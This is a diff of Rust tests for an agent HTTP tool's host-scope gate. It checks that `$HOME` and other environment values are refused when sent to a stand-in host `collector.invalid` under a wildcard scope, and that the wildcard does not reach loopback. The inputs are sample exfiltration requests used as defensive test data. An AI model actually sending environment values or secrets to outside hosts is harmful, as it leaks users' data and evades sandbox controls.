@@ -796,7 +796,9 @@ mod tests {
     }
 
     /// S2: an env value (URL, header or auth) goes only to a host
-    /// `net_hosts` names; `"*"` alone is not enough and nothing is sent.
+    /// `net_hosts` names; `"*"` alone is not enough and nothing is sent
+    /// (the gate runs before any connection: the `.invalid` host is never
+    /// resolved). A named host gets it.
     #[tokio::test]
     async fn env_value_needs_a_named_host() {
         use std::sync::atomic::Ordering::SeqCst;
@@ -809,10 +811,11 @@ mod tests {
             ..Default::default()
         };
         let wild = HttpHarness::with_scope(tmp.path(), scope(&["*"]));
+        let far = "http://collector.invalid";
         for args in [
-            json!({"url": format!("{base}/?h=$HOME"), "method": "GET"}),
-            json!({"url": format!("{base}/"), "method": "GET", "headers": "{\"X-K\":\"$HOME\"}"}),
-            json!({"url": format!("{base}/"), "method": "GET", "auth_bearer_env": "HOME"}),
+            json!({"url": format!("{far}/?h=$HOME"), "method": "GET"}),
+            json!({"url": format!("{far}/"), "method": "GET", "headers": "{\"X-K\":\"$HOME\"}"}),
+            json!({"url": format!("{far}/"), "method": "GET", "auth_bearer_env": "HOME"}),
         ] {
             let err = HttpRequestTool::new()
                 .execute(&args, &wild.ctx())
@@ -823,16 +826,6 @@ mod tests {
                 "{err:#}"
             );
         }
-        assert_eq!(hits.load(SeqCst), 0);
-        // No env value: `"*"` is enough.
-        HttpRequestTool::new()
-            .execute(
-                &json!({"url": format!("{base}/"), "method": "GET"}),
-                &wild.ctx(),
-            )
-            .await
-            .unwrap();
-        assert_eq!(hits.load(SeqCst), 1);
         let named = HttpHarness::with_scope(tmp.path(), scope(&["*", "127.0.0.1"]));
         HttpRequestTool::new()
             .execute(
@@ -841,7 +834,31 @@ mod tests {
             )
             .await
             .unwrap();
-        assert_eq!(hits.load(SeqCst), 2);
+        assert_eq!(hits.load(SeqCst), 1);
+    }
+
+    /// S13: `"*"` does not reach a loopback server; naming it does.
+    #[tokio::test]
+    async fn wildcard_does_not_reach_loopback() {
+        let (base, hits) =
+            serve("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok").await;
+        let tmp = TempDir::new().unwrap();
+        let wild = HttpHarness::with_scope(
+            tmp.path(),
+            ToolScope {
+                net_hosts: vec!["*".into()],
+                ..Default::default()
+            },
+        );
+        let err = HttpRequestTool::new()
+            .execute(
+                &json!({"url": format!("{base}/"), "method": "GET"}),
+                &wild.ctx(),
+            )
+            .await
+            .unwrap_err();
+        assert!(format!("{err:#}").contains("name it"), "{err:#}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0);
     }
 
     #[test]
